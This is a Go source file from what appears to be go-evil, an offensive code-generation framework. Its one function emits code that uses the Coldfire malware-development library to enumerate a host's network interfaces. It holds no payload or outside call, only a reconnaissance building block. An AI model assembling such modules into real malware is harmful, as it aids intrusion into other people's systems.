package network

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Grabs all interfaces
// Input None
// The return is an evil array containing all found interfaces which is placed in a runtime variable
func get_interfaces(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_interfaces"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"interfaces := coldfire.Ifaces()",
		"arr := structure.Create_evil_object(\"\")",
		"for _, d_int := range interfaces{",
		"arr.Append(d_int)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
